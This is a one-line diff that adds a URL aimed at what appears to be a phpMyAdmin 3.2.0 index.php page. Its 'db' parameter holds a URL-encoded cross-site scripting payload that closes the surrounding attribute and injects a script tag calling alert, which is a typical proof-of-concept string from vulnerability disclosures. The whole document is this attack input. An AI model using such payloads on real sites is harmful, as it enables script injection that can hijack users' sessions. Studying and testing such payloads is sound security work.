@@ -1,0 +1,1 @@
+http://www.example.com/MAINT_3_2_0/index.php?db=%22%3E%27%3E%3Cscript%3Ealert%28%2Fr0t%2F%29%3C%2Fscript%3E&token=f70d8ec4305c5a877f56c14554aced10
